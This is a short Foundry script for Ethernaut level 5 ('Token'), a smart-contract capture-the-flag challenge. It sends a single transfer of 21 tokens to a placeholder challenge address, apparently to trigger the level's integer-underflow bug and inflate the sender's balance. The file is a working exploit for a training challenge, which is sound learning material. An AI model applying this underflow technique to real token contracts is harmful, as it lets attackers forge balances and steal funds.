// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "../src/Ethernaut Challenge/05_Token.sol";

contract ExploitScript is Script {
    Token level05 = Token(your_challenge_address);

    function run() external {
        vm.startBroadcast();

        level05.transfer(your_challenge_address, 21);

        vm.stopBroadcast();
    }
}